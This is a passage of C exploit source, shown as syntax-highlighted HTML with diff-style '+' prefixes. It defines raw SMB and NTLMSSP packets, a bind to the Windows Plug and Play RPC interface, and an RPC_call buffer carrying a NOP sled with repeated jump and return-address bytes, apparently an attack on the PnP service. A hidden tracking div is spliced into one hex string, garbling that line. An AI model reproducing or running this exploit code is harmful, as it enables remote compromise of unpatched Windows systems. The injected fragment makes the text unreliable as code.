+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>57<span class="es0">\x</span>00<span class="es0">\x</span>69<span class="es0">\x</span>00<span class="es0">\x</span>6E<span class="es0">\x</span>00<span class="es0">\x</span>64<span class="es0">\x</span>00<span class="es0">\x</span>6F<span class="es0">\x</span>00<span class="es0">\x</span>77<span class="es0">\x</span>00<span class="es0">\x</span>73<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>32<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>32<span class="es0">\x</span>00<span class="es0">\x</span>31<span class="es0">\x</span>00<span class="es0">\x</span>39<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>35<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>57<span class="es0">\x</span>00<span class="es0">\x</span>69<span class="es0">\x</span>00<span class="es0">\x</span>6E<span class="es0">\x</span>00<span class="es0">\x</span>64<span class="es0">\x</span>00<span class="es0">\x</span>6F<span class="es0">\x</span>00<span class="es0">\x</span>77<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>73<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>32<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>35<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>2E<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char SMB_SessionSetupAndX2<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>DA<span class="es0">\x</span>FF<span class="es0">\x</span>53<span class="es0">\x</span>4D<span class="es0">\x</span>42<span class="es0">\x</span>73<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>07<span class="es0">\x</span>C8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>FF<span class="es0">\x</span>FE"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>0C<span class="es0">\x</span>FF<span class="es0">\x</span>00<span class="es0">\x</span>DA<span class="es0">\x</span>00<span class="es0">\x</span>04<span class="es0">\x</span>11<span class="es0">\x</span>0A<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>57<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>D4<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>80<span class="es0">\x</span>9F<span class="es0">\x</span>00<span class="es0">\x</span>4E"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>54<span class="es0">\x</span>4C<span class="es0">\x</span>4D<span class="es0">\x</span>53<span class="es0">\x</span>53<span class="es0">\x</span>50<span class="es0">\x</span>00<span class="es0">\x</span>03<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>46"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>47<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>40"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>40<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>06<span class="es0">\x</span>00<span class="es0">\x</span>06<span class="es0">\x</span>00<span class="es0">\x</span>40"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>47<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>15<span class="es0">\x</span>8A<span class="es0">\x</span>88<span class="es0">\x</span>E0<span class="es0">\x</span>48"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>4F<span class="es0">\x</span>00<span class="es0">\x</span>44<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>ED<span class="es0">\x</span>41<span class="es0">\x</span>2C<span class="es0">\x</span>27<span class="es0">\x</span>86<span class="es0">\x</span>26<span class="es0">\x</span>D2<span class="es0">\x</span>59<span class="es0">\x</span>A0<span class="es0">\x</span>B3"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>5E<span class="es0">\x</span>AA<span class="es0">\x</span>00<span class="es0">\x</span>88<span class="es0">\x</span>6F<span class="es0">\x</span>C5<span class="es0">\x</span>57<span class="es0">\x</span>00<span class="es0">\x</span>69<span class="es0">\x</span>00<span class="es0">\x</span>6E<span class="es0">\x</span>00<span class="es0">\x</span>64<span class="es0">\x</span>00<span class="es0">\x</span>6F<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>77<span class="es0">\x</span>00<span class="es0">\x</span>73<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>32<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>32<span class="es0">\x</span>00<span class="es0">\x</span>31<span class="es0">\x</span>00<span class="es0">\x</span>39<span class="es0">\x</span>00<span class="es0">\x</span>35<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>57<span class="es0">\x</span>00<span class="es0">\x</span>69<span class="es0">\x</span>00<span class="es0">\x</span>6E<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>64<span class="es0">\x</span>00<span class="es0">\x</span>6F<span class="es0">\x</span>00<span class="es0">\x</span>77<span class="es0">\x</span>00<span class="es0">\x</span>73<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>32<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>20<span class="es0">\x</span>00<span class="es0">\x</span>35<span class="es0">\x</span>00<span class="es0">\x</span>2E<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char SMB_TreeConnectAndX<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>5A<span class="es0">\x</span>FF<span class="es0">\x</span>53<span class="es0">\x</span>4D<span class="es0">\x</span>42<span class="es0">\x</span>75<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>07<span class="es0">\x</span>C8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>FF<span class="es0">\x</span>FE"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>04<span class="es0">\x</span>FF<span class="es0">\x</span>00<span class="es0">\x</span>5A<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>2F<span class="es0">\x</span>00<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char SMB_TreeConnectAndX_<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>3F<span class="es0">\x</span>3F<span class="es0">\x</span>3F<span class="es0">\x</span>3F<span class="es0">\x</span>3F<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">/* browser */</div></li>
+<li class="li1"><div class="de1">unsigned char SMB_PipeRequest_browser<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>66<span class="es0">\x</span>FF<span class="es0">\x</span>53<span class="es0">\x</span>4D<span class="es0">\x</span>42<span class="es0">\x</span>A2<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>07<span class="es0">\x</span>C8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>78<span class="es0">\x</span>04"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>40<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>FF<span class="es0">\x</span>00<span class="es0">\x</span>DE<span class="es0">\x</span>DE<span class="es0">\x</span>00<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>16<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>9F<span class="es0">\x</span>01<span class="es0">\x</span>02<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>40<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>02<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>03<span class="es0">\x</span>13<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x<div id="extwaiokist" style="display:none" v="nipgg" q="83368305" c="68.65" i="75" u="7.376" s="05092320" sg="svr_04262315-ga_05092320-bai_undefined" d="1" w="false" e="" a="3" m="BMe=" vn="9adfy"><div id="extwaigglbit" style="display:none" v="nipgg" q="83368305" c="68.65" i="75" u="7.376" s="05092320" sg="svr_04262315-ga_05092320-bai_undefined" d="1" w="false" e="" a="3" m="BMe="></div></div></span>5C<span class="es0">\x</span>00<span class="es0">\x</span>62<span class="es0">\x</span>00<span class="es0">\x</span>72<span class="es0">\x</span>00<span class="es0">\x</span>6F<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>77<span class="es0">\x</span>00<span class="es0">\x</span>73<span class="es0">\x</span>00<span class="es0">\x</span>65<span class="es0">\x</span>00<span class="es0">\x</span>72<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char SMB_PNPEndpoint<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">/* 8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0: pnp */</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>9C<span class="es0">\x</span>FF<span class="es0">\x</span>53<span class="es0">\x</span>4D<span class="es0">\x</span>42<span class="es0">\x</span>25<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>07<span class="es0">\x</span>C8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>78<span class="es0">\x</span>04"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>50<span class="es0">\x</span>00<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>48<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>54<span class="es0">\x</span>00<span class="es0">\x</span>48<span class="es0">\x</span>00<span class="es0">\x</span>54<span class="es0">\x</span>00<span class="es0">\x</span>02"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>26<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>40<span class="es0">\x</span>59<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>5C<span class="es0">\x</span>00<span class="es0">\x</span>50<span class="es0">\x</span>00<span class="es0">\x</span>49<span class="es0">\x</span>00<span class="es0">\x</span>50<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>45<span class="es0">\x</span>00<span class="es0">\x</span>5C<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>40<span class="es0">\x</span>00<span class="es0">\x</span>05<span class="es0">\x</span>00<span class="es0">\x</span>0B<span class="es0">\x</span>03<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>48<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>B8<span class="es0">\x</span>10<span class="es0">\x</span>B8<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>40<span class="es0">\x</span>4E<span class="es0">\x</span>9F<span class="es0">\x</span>8D<span class="es0">\x</span>3D<span class="es0">\x</span>A0<span class="es0">\x</span>CE<span class="es0">\x</span>11"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>8F<span class="es0">\x</span>69<span class="es0">\x</span>08<span class="es0">\x</span>00<span class="es0">\x</span>3E<span class="es0">\x</span>30<span class="es0">\x</span>05<span class="es0">\x</span>1B<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>04<span class="es0">\x</span>5D<span class="es0">\x</span>88<span class="es0">\x</span>8A"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>EB<span class="es0">\x</span>1C<span class="es0">\x</span>C9<span class="es0">\x</span>11<span class="es0">\x</span>9F<span class="es0">\x</span>E8<span class="es0">\x</span>08<span class="es0">\x</span>00<span class="es0">\x</span>2B<span class="es0">\x</span>10<span class="es0">\x</span>48<span class="es0">\x</span>60<span class="es0">\x</span>02<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">unsigned char RPC_call<span class="br0">[</span><span class="br0">]</span> <span class="sy0">=</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>FF<span class="es0">\x</span>53<span class="es0">\x</span>4D<span class="es0">\x</span>42<span class="es0">\x</span>25<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>18<span class="es0">\x</span>07<span class="es0">\x</span>C8"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>78<span class="es0">\x</span>04"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>08<span class="es0">\x</span>60<span class="es0">\x</span>00<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>3C<span class="es0">\x</span>08<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>54<span class="es0">\x</span>00<span class="es0">\x</span>3C<span class="es0">\x</span>08<span class="es0">\x</span>54<span class="es0">\x</span>00<span class="es0">\x</span>02"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>00<span class="es0">\x</span>26<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>40<span class="es0">\x</span>4D<span class="es0">\x</span>08<span class="es0">\x</span>00<span class="es0">\x</span>5C<span class="es0">\x</span>00<span class="es0">\x</span>50<span class="es0">\x</span>00<span class="es0">\x</span>49<span class="es0">\x</span>00<span class="es0">\x</span>50<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>45<span class="es0">\x</span>00<span class="es0">\x</span>5C<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>40<span class="es0">\x</span>00<span class="es0">\x</span>05<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>03<span class="es0">\x</span>10<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>3C<span class="es0">\x</span>08<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>01<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>24<span class="es0">\x</span>08<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>36<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>11<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>11<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>52<span class="es0">\x</span>00<span class="es0">\x</span>4F<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>4F<span class="es0">\x</span>00<span class="es0">\x</span>54<span class="es0">\x</span>00<span class="es0">\x</span>5C<span class="es0">\x</span>00<span class="es0">\x</span>53<span class="es0">\x</span>00<span class="es0">\x</span>59<span class="es0">\x</span>00<span class="es0">\x</span>53<span class="es0">\x</span>00<span class="es0">\x</span>54<span class="es0">\x</span>00<span class="es0">\x</span>45<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>4D<span class="es0">\x</span>00<span class="es0">\x</span>5C<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>30<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>FF<span class="es0">\x</span>FF<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>E0<span class="es0">\x</span>07<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>C0<span class="es0">\x</span>07<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>00<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>90"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76"</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="st0">"<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76<span class="es0">\x</span>EB<span class="es0">\x</span>08<span class="es0">\x</span>90<span class="es0">\x</span>90<span class="es0">\x</span>67<span class="es0">\x</span>15<span class="es0">\x</span>7a<span class="es0">\x</span>76"</span></div></li>
